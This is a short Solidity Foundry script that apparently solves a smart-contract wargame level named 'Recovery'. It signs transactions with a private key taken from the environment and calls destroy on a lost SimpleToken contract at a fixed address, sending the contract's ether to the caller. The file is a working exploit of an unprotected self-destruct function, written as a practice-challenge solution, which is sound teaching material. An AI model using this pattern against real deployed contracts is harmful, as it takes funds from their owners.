// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Recovery, SimpleToken} from "../src/Recovery.sol";
import {Script, console} from "forge-std/script.sol";

contract RecoverySolution is Script {
    SimpleToken simpleToken = SimpleToken(payable(address(0xc5A9e78a526a9C0CD67Ec8418346E1D20aa31804)));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        simpleToken.destroy(payable(msg.sender));
        vm.stopBroadcast();
    }
}
